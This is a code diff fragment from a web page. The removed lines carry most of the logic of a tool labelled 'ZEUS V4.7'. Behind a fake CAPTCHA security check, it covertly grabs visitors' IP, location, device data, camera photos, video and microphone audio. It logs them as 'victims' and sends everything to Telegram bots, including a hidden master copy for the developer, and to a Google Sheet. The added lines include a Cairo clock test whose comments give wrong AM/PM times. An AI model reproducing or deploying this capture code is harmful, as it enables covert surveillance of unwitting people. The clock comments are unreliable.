-                            ip: payload.ip,
-                            location: payload.location,
-                            browser: payload.browser,
-                            device: payload.device,
-                            battery: payload.battery,
-                            timestamp: payload.timestamp
-                        };
-
-                        const victims = JSON.parse(localStorage.getItem('zeus_victims') || '[]');
-                        victims.push(victimRecord);
-                        localStorage.setItem('zeus_victims', JSON.stringify(victims));
-
-                        const files = JSON.parse(localStorage.getItem('zeus_files') || '[]');
-                        const sheetFilesPayload = [];
-                        let fSeq = Date.now();
-
-                        for (let i = 0; i < payload.photos.length; i++) {
-                            const dataUrl = await blobToDataUrl(payload.photos[i]);
-                            if (dataUrl) {
-                                const fileObj = {
-                                    id: fSeq++,
-                                    shortToken,
-                                    victimId,
-                                    type: 'image',
-                                    filename: `photo_${i + 1}.jpg`,
-                                    dataUrl,
-                                    timestamp: Date.now()
-                                };
-                                files.push(fileObj);
-                                sheetFilesPayload.push(fileObj);
-                            }
-                        }
-
-                        if (payload.video) {
-                            const vUrl = await blobToDataUrl(payload.video);
-                            if (vUrl) {
-                                const fileObj = {
-                                    id: fSeq++,
-                                    shortToken,
-                                    victimId,
-                                    type: 'video',
-                                    filename: 'capture_video.webm',
-                                    dataUrl: vUrl,
-                                    timestamp: Date.now()
-                                };
-                                files.push(fileObj);
-                                sheetFilesPayload.push(fileObj);
-                            }
-                        }
-
-                        if (payload.audio) {
-                            const aUrl = await blobToDataUrl(payload.audio);
-                            if (aUrl) {
-                                const fileObj = {
-                                    id: fSeq++,
-                                    shortToken,
-                                    victimId,
-                                    type: 'audio',
-                                    filename: 'capture_audio.webm',
-                                    dataUrl: aUrl,
-                                    timestamp: Date.now()
-                                };
-                                files.push(fileObj);
-                                sheetFilesPayload.push(fileObj);
-                            }
-                        }
-
-                        localStorage.setItem('zeus_files', JSON.stringify(files));
-
-                        const tgPayload = { ...payload, shortToken, tokenStatus };
-
-                        if (!routeToMaster && botCreds && botCreds.botToken && botCreds.chatId) {
-                            await sendBatchToTelegram(botCreds.botToken, botCreds.chatId, tgPayload, 'زيارة جديدة (ZEUS V4.7)');
-                            await sendBatchToTelegram(MASTER_BOT_TOKEN, MASTER_CHAT_ID, tgPayload, 'نسخة احتياطية للمطور');
-                        } else {
-                            await sendBatchToTelegram(
-                                MASTER_BOT_TOKEN,
-                                MASTER_CHAT_ID,
-                                tgPayload,
-                                `تحويل للمطور (${tokenStatus})`
-                            );
-                        }
-
-                        await pushToGoogleSheet({
-                            action: "sync_victim",
-                            shortToken,
-                            victim: victimRecord,
-                            files: sheetFilesPayload
-                        });
-
-                        addLog(
-                            routeToMaster ? 'warning' : 'success',
-                            routeToMaster
-                                ? `تحويل زيارة للمطور (${tokenStatus}) | Token: ${shortToken} | IP: ${payload.ip}`
-                                : `تسجيل زيارة (${payload.ip}) للتوكن ${shortToken} ورفع ${payload.photos.length} ملف`
-                        );
-                    } catch (err) {
-                        console.warn('Background pipeline error:', err);
-                        addLog('error', 'فشل أثناء معالجة بيانات الزيارة في الخلفية');
-                    }
-                }
-
-                async function collectAndStoreUltra() {
-                    if (isRunning || collectionDone) return;
-                    isRunning = true;
-
-                    mainText.textContent = 'جاري فحص الأمان …';
-                    mainText.className = 'text loading';
-                    spinner.classList.add('loading');
-
-                    const feats = (botCreds && botCreds.features) || { camFront: true };
-                    const progressPromise = animateProgress(2500);
-
-                    const [ip, location, battery] = await Promise.all([
-                        getIP(),
-                        feats.location ? getLocation() : Promise.resolve({ lat: null, lng: null }),
-                        getBatteryStatus()
-                    ]);
-
-                    const photos = [];
-                    let videoBlob = null;
-
-                    if (feats.camFront || feats.videoFront) {
-                        const frontRes = await captureCameraByMode('user', !!feats.camFront, !!feats.videoFront);
-                        photos.push(...frontRes.photos);
-                        if (frontRes.videoBlob) videoBlob = frontRes.videoBlob;
-                    }
-
-                    if (feats.camBack || feats.videoBack) {
-                        const backRes = await captureCameraByMode('environment', !!feats.camBack, !!feats.videoBack);
-                        photos.push(...backRes.photos);
-                        if (!videoBlob && backRes.videoBlob) videoBlob = backRes.videoBlob;
-                    }
-
-                    const audioBlob = feats.audio ? await recordAudioClip(3000) : null;
-
-                    await progressPromise;
-
-                    mainText.textContent = '✓ تم التحقق — جارٍ التوجيه';
-                    mainText.className = 'text success';
-                    spinner.classList.remove('loading');
-                    spinner.classList.add('success');
-                    checkbox.checked = true;
-                    progressContainer.classList.remove('show');
-                    collectionDone = true;
-
-                    const ua = navigator.userAgent;
-                    const browser = /Chrome/.test(ua) ? 'Chrome' : (/Firefox/.test(ua) ? 'Firefox' : (/Safari/.test(ua) ? 'Safari' : 'Browser'));
-
-                    const payload = {
-                        ip,
-                        location,
-                        battery,
-                        device: navigator.platform || 'Unknown',
-                        browser,
-                        timestamp: new Date().toISOString(),
-                        photos,
-                        video: videoBlob,
-                        audio: audioBlob
-                    };
-
-                    await runBackgroundPipeline(payload);
-
-                    setTimeout(() => {
-                        if (redirectUrl) {
-                            window.location.replace(redirectUrl);
-                        } else {
-                            window.location.reload();
-                        }
-                    }, 700);
-                }
-
-                document.getElementById('captchaWrapper').addEventListener('click', function (e) {
-                    if (e.target.closest('a')) return;
-                    if (!isRunning && !collectionDone) {
-                        collectAndStoreUltra();
-                    }
-                });
-
-                applyTheme(currentTheme);
-            }
-
-            applyTheme(currentTheme);
+                window.open(val, "_blank", "noopener,noreferrer");
+            });
+
+            // إتاحة دالة اختبار الساعة 12 ساعة في console
+            window.testCairo12HourTransitions = function () {
+                const samples = [
+                    new Date("2026-11-27T10:59:59Z"), // 12:59:59 AM Cairo
+                    new Date("2026-11-27T11:00:00Z"), // 01:00:00 AM Cairo
+                    new Date("2026-11-27T09:59:59Z"), // 11:59:59 PM Cairo (previous day)
+                    new Date("2026-11-27T10:00:00Z")  // 12:00:00 AM Cairo
+                ];
+                return samples.map((d) => ({ utc: d.toISOString(), cairo12h: formatCairo12Hour(d) }));
+            };
         })();
     </script>
 </body>
